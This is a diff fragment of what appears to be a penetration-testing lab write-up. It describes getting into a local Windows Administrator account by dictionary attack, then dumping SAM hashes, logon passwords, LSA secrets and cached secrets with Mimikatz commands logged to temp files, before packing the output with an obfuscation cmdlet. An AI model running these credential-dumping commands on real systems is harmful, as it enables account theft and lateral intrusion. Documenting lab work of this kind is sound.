@@ -7,12 +7,11 @@ This was accomplished through using a dictionary attack on the locao Administrat
 This was accomplished through use of Mimikatz.exe on a local Windows host within the domain, with 
 these Mimi commands:
 
--
 - log C:\Users\<username>\AppData\Local\Temp\MimiSAM.txt      lsadump::sam
 - log C:\Users\<username>\AppData\Local\Temp\MimiPW.txt       sekurlsa::logonpasswords
 - log C:\Users\<username>\AppData\Local\Temp\MimiHash.txt     lsadump::lsa
 - log C:\Users\<username>\AppData\Local\Temp\MimiSecrets.txt  lsadump::secrets
-- 
+  
 each exported to its log file within a directory.
 
 Then, Cmdlet [Obfuscate-Pack](https://github.com/Jonathan-D-a-v-i-d/LabTools/blob/main/Functions/Obfuscate-Pack.ps1) was used, 
